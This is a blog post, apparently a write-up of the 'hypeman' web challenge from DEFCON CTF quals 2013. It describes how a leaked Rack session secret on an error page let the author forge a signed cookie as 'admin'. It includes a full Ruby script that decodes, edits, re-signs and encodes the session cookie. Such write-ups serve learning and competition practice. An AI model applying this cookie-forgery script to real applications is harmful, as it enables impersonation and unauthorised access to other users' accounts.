---
title: hypeman - DEFCON CTF quals 2013
author: sebbe
layout: post
published: true
date: 2013-06-19 12:50:47
---

Challenge description:
> http://hypeman.shallweplayaga.me/

We are greeted by a login box, as well as a link to some secrets.

![welcome screen](/public/img/hypeman-welcomescreen.png )

Picking an unused username allows for login to the secrets listing.

![secrets](/public/img/hypeman-secrets.png )

On the list, one secret in particular stands out; the one titled "key", posted by "admin". Attempting to access it, however, reveals a runtime error with a stack trace. In the stack trace, one can see, that the only the user that posted a secret can view it.

![runtime error](/public/img/hypeman-runtime-error.png )

A bit of a read through the error page shows, that the page runs on [Rack](http://github.com/rack/rack). The page also shows, that the cookie contains, among other things, the username of the current user. (In fact, anything stored in the `rack.session` variable, see the [relevant implementation](https://github.com/rack/rack/blob/rack-1.2/lib/rack/session/cookie.rb#L52))  However, this cookie is signed based on a site secret.

![cookie and secret](/public/img/hypeman-leaked-secret.png )

Luckily, the runtime error was also nice enough to leak this for us. This allowed us to write the following script, which takes a valid cookie, and rewrites it to have username `admin`.

```ruby
require 'openssl'
require 'open-uri'

session_data = "BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFN2Q5YmQ2MmZhZGQ0OWQ1ZTNkYTIz\nYjc3NWYyYTIxZTQ4YTNjZGI3ZDQ2ZTRjMmJiNDFiOTg2NDhhMjk3MDU5OEki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItZWNhOGFi\nMTI2NTU5ZjRjODNkYTgzMDdmYTJhYTJhMGNiYWQ2YjExOEkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItOTZi\nMDU5NjMyOGFlODU5ZDYzNjdiODBkNzgzZTg2NDUwMjNiMmU4N0kiCWNzcmYG\nOwBGIkViOWU1ZjI3Y2IxOWM0ZjVkODk3MDE3NDVhY2MyMzJkODQxMjYxYWZm\nZTM5NWQ3YTU1YmEyNzAxNWM1NDg2ODY2SSIOdXNlcl9uYW1lBjsARkkiCGhl\nagY7AFQ=\n--c83a211ad1b46d84b6a9f1ec96d7bab8972d9177"

session_data, digest = session_data.split("--")
session_data = session_data.unpack("m*").first
session_data = Marshal.load(session_data)

session_data["user_name"] = "admin"

session_data = Marshal.dump(session_data)
session_data = [session_data].pack("m*")

hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, "wroashsoxDiculReejLykUssyifabEdGhovHabno", session_data)

session_data = "#{session_data}--#{hmac}"

session_data = URI::encode(session_data)
session_data = session_data.gsub("=", "%3D")

print session_data
```

Swapping our old cookie for the new one yielded the key. (...and not prefixed by "The key is: ", might I add!)

![the key](/public/img/hypeman-key.png )
